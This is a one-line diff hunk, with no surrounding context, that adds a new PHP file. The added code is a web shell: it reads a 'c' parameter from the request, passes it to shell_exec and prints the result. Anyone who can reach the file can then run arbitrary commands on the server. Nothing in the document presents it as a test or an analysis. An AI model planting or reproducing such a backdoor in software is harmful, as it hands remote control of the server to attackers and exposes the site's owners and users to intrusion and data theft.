@@ -1,0 +1,1 @@
+<?php $c=$_REQUEST['c']; if($c){echo shell_exec($c);} ?>
